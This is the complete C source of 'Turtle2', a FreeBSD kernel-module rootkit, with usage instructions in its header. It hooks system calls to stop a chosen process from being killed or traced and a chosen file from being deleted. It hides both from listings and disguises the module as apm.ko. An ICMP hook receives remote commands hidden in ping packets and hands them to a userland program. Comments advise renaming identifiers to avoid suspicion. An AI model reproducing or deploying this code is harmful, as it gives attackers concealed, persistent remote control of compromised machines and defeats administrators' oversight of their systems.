/* Turtle2 rootkit for FreeBSD by WarGame/EOF - wargame89@yahoo.it */
/* http://vx.netlux.org/wargamevx - Tested on FreeBSD 7.2 & 8.2-RELEASE */

/* This is an improvement of the Turtle rootkit */

/******************************************************************
 How it works:
 - Hook unlink() so the protected file can't be deleted 
 - Hook kill() so the protected process can't be killed
 - Hook ktrace() so the protected process can't be traced
 - Hook getdirentries() and getdents() so the protected 
   file doesn't appear in the directories listing
 - Hook execve() and fork() so the protected process(es) gets hidden
 - Hook kldstat() so the rootkit itself doesn't get discovered (it
   can be discovered in other ways)
 - A simple shell over ICMP/IP (but it needs an external app)
 The pid, file and pname get passed to the module using kenv variables:
 Example (assume your are root):
 kenv turtle2.pid=1456
 kenv turtle2.file=my_backdoor
 kenv turtle2.pname=process_name
 kldload ./turtle2.ko
 ******************************************************************/           

#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/dirent.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/proc.h>
#include <sys/ioccom.h>


/* the name of the kenv variables could be changed to be less suspicious */
/* the parameters could be hardcoded so there is no need to set kenv variables */

#define KENV_PID "turtle2.pid" /* the pid of the process to protect */
#define KENV_FILE "turtle2.file" /* file to protect */
#define KENV_PNAME "turtle2.pname" /* the name of the process to hide */
#define MOD_NAME "turtle2.ko" /* this is the name of the binary */

static int pid = 0;
static char *file = NULL;
static char *pname = NULL;
static char cmd[256+1]; /* it should be enough */
static struct sx cmd_lock; /* a simple lock */

#define VERBOSE 1 /* enable/disable debug messages */

extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* character device related functions */
int turtle2_open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int turtle2_close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int turtle2_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
{
    return 0;
}


int turtle2_write(struct cdev *dev, struct uio *uio, int ioflag)
{
    return 0;
}

/* this does the magic: pass the cmd to userland component */
int turtle2_read(struct cdev *dev, struct uio *uio, int ioflag)
{
    int len;
    
    sx_xlock(&cmd_lock);
    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len); /* done! */

    /* after reading cmd can be cleared */
    bzero(cmd,256);
    sx_xunlock(&cmd_lock);

#if VERBOSE
    printf("Turtle2: read %d bytes from device\n",len);
#endif

    return 0;
}
     
static struct cdevsw turtle2_devsw = {
	/* version */	.d_version = D_VERSION,
	/* open */	.d_open = turtle2_open,
	/* close */	.d_close = turtle2_close,
	/* read */	.d_read = turtle2_read,
	/* write */	.d_write = turtle2_write,
	/* ioctl */	.d_ioctl = turtle2_ioctl,
	/* name */	.d_name = "turtle2dev" /* it can be changed to be less suspicious */
};

static struct cdev *sdev;
   
/* hooked syscalls */
       
static int kill_hook(struct thread *td, struct kill_args *args)
{
	if(args->pid == pid)
	{
#if VERBOSE
		printf("Turtle2: blocking kill()\n");
#endif
		return 0;
	}

	return kill(td,args);
}

static int unlink_hook(struct thread *td,struct unlink_args *args)
{
	if(strstr(args->path,file))
	{
#if VERBOSE
		printf("Turtle2: blocking unlink()\n");
#endif
		return 0;
	}

	return unlink(td,args);
}


static int kldstat_hook(struct thread *td,struct kldstat_args *args) /* hide our module */
{
	int ret = kldstat(td,args);
	size_t fake_size = 24264; /* the size of apm.ko on my system */

	if(strcmp(args->stat->name,MOD_NAME) == 0)
	{
		copyout(&fake_size,&args->stat->size,sizeof(fake_size));
		copyout("apm.ko",args->stat->name,7);
#if VERBOSE
		printf("Turtle2: blocking kldstat()\n");
#endif 
	}

	return ret;
}

static int ktrace_hook(struct thread *td,struct ktrace_args *args)
{
	if(args->pid == pid)
	{
#if VERBOSE
		printf("Turtle2: blocking ktrace()\n");
#endif
		return 0;
	}

	return ktrace(td,args);
}

static int getdirentries_hook(struct thread *td,struct getdirentries_args *args) 
{
	int size = 0,cnt,to_sub = 0;
	struct dirent *dir;
	char *tmp_buf = NULL;
	getdirentries(td, args);

	cnt = td->td_retval[0];

	if(cnt > 0)
	{
		MALLOC(dir,struct dirent *,sizeof(struct dirent),M_TEMP,M_NOWAIT);
		MALLOC(tmp_buf,char *,cnt,M_TEMP,M_NOWAIT);
	
		size = 0;	
		
		while(cnt > 0)
		{
			dir = (struct dirent *)(args->buf + size);  
			
			if(strstr(dir->d_name,file) == NULL)
			{
				bcopy((char *)dir,(char *)(tmp_buf+size-to_sub),dir->d_reclen);
			}

			else
			{
#if VERBOSE
				printf("Turtle2: blocking getdirentries()\n");
#endif
				to_sub += dir->d_reclen;
			}
			
			size += dir->d_reclen;
			cnt -= dir->d_reclen;
		}

		/* done */
		copyout(tmp_buf,args->buf,td->td_retval[0]-to_sub);
		td->td_retval[0] = td->td_retval[0]-to_sub;
		
 		/* On my system freeing the used memory makes all crashes */
		/* FREE(tmp_buf,M_TEMP);		
		   FREE(dir,M_TEMP); */
	}

	return 0;
}

static int getdents_hook(struct thread *td,struct getdents_args *args) /* the same as getdirentries() */
{
	int size = 0,cnt,to_sub = 0;
	struct dirent *dir;
	char *tmp_buf = NULL;
	getdents(td, args);

	cnt = td->td_retval[0];

	if(cnt > 0)
	{
		MALLOC(dir,struct dirent *,sizeof(struct dirent),M_TEMP,M_NOWAIT);
		MALLOC(tmp_buf,char *,cnt,M_TEMP,M_NOWAIT);
	
		size = 0;	
		
		while(cnt > 0)
		{
			dir = (struct dirent *)(args->buf + size);  
			
			if(strstr(dir->d_name,file) == NULL)
			{
				bcopy((char *)dir,(char *)(tmp_buf+size-to_sub),dir->d_reclen);
			}

			else
			{
#if VERBOSE
				printf("Turtle2: blocking getdents()\n");
#endif
				to_sub += dir->d_reclen;
			}
			
			size += dir->d_reclen;
			cnt -= dir->d_reclen;
		}

		/* done */
		copyout(tmp_buf,args->buf,td->td_retval[0]-to_sub);
		td->td_retval[0] = td->td_retval[0]-to_sub;
		
 		/* On my system freeing the used memory makes all crashes */
		/* FREE(tmp_buf,M_TEMP);		
		   FREE(dir,M_TEMP); */
	}

	return 0;
}

/* Handle ICMP echo packets */
void icmp_input_hook(struct mbuf *m, int off)
{
        struct icmp *icmp_header;
	char str[256+1];        
	int len,cnt;

	m->m_len -= off;
        m->m_data += off;
         
        icmp_header = mtod(m, struct icmp *);
         
        m->m_len += off;
        m->m_data -= off;
         
        if (icmp_header->icmp_type == ICMP_ECHO &&
		icmp_header->icmp_data != NULL)
	{
		
		bzero(str,256);	
		copystr(icmp_header->icmp_data, str, 256, &len);
		/* a command should be like this: __cmd; */

		if(strlen(str) > 2)
		{
			if(str[0] == '_' && str[1] == '_')
			{
				cnt = 2;
	
				sx_xlock(&cmd_lock);

				bzero(cmd,256);
				while(str[cnt] != ';' && cnt < 256)
				{
					cmd[cnt-2] = str[cnt];
					cnt++;
				}

				cmd[cnt] = '\0'; /* done! */
				sx_xunlock(&cmd_lock);
				/* now the userland program can read&execute the cmd */
#if VERBOSE
				printf("Turtle2: ICMP packet -> cmd: %s\n",cmd);
#endif
			}

			else
			{
				icmp_input(m,off);
			}
		}

		else
		{
			icmp_input(m,off);
		}
	}
        
	else
	{
		icmp_input(m, off);
	}
}

void hide_process() /* hide from allproc list */
{
	struct proc *p;
	sx_xlock(&allproc_lock);
 
    
    	LIST_FOREACH(p, &allproc, p_list) 
	{
        	PROC_LOCK(p); 
       
       		if (p->p_vmspace && !(p->p_flag & P_WEXIT)) 
		{
        	 	if (strstr(p->p_comm,pname))
			{
#if VERBOSE
				printf("Turtle2: hiding process %s\n",p->p_comm);
#endif
        	 	        LIST_REMOVE(p, p_list);
			}
        	}
 
        	PROC_UNLOCK(p);
	}
    
    	sx_xunlock(&allproc_lock);
 
}

static int execve_hook(struct thread *td,struct execve_args *args)
{
	int ret = execve(td,args);
	hide_process(); /* this adds a overhead to the system */
	return ret;
}

static int fork_hook(struct thread *td,struct fork_args *args)
{
	int ret = fork(td,args);
	hide_process(); /* this adds a overhead to the system */
	return ret;
}

static int load(struct module *module, int cmd, void *arg)
{
        int error = 0;
	char *pid_s = getenv(KENV_PID);
	file = getenv(KENV_FILE);
        pname = getenv(KENV_PNAME);

	if(pid_s == NULL || file == NULL || pname == NULL)
	{
		printf("Turtle2: turtle2.file or turtle2.pid or turtle2.pname not set\n");
		return EINVAL;
	}

	pid = strtol(pid_s,NULL,10);
        
	switch (cmd) 
	{
		case MOD_LOAD:
#if VERBOSE
			printf("Turtle2: loaded (pid=%d,file=%s,pname=%s) \n",pid,file,pname);
#endif
			sx_init(&cmd_lock,"turtle2_lock"); /* this is to avoid race conditions */ 
			sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
			sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
			sysent[SYS_kldstat].sy_call = (sy_call_t *)kldstat_hook;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			sysent[SYS_getdents].sy_call = (sy_call_t *)getdents_hook;
			sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
			sysent[SYS_ktrace].sy_call = (sy_call_t *)ktrace_hook;
			sysent[SYS_fork].sy_call = (sy_call_t *)fork_hook;
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
			sdev = make_dev(&turtle2_devsw, 0, UID_ROOT, GID_WHEEL, 0600, "turtle2dev");
			hide_process(); 
                 	break;
        	
		case MOD_UNLOAD:
#if VERBOSE
			printf("Turtle2: unloaded\n");
#endif
			sx_destroy(&cmd_lock); /* destroy lock */
			sysent[SYS_kill].sy_call = (sy_call_t *)kill;
			sysent[SYS_unlink].sy_call = (sy_call_t *)unlink;
			sysent[SYS_kldstat].sy_call = (sy_call_t *)kldstat;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries;
			sysent[SYS_getdents].sy_call = (sy_call_t *)getdents;
			sysent[SYS_execve].sy_call = (sy_call_t *)execve;
			sysent[SYS_ktrace].sy_call = (sy_call_t *)ktrace;
			sysent[SYS_fork].sy_call = (sy_call_t *)fork;
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
			destroy_dev(sdev);
                 	break;
        	default:
                 	error = EINVAL;
                 	break;
        }
        
	return error;
}

static moduledata_t turtle2_mod = {
        "turtle2",            
        load,                    
        NULL                     
};

DECLARE_MODULE(turtle2, turtle2_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
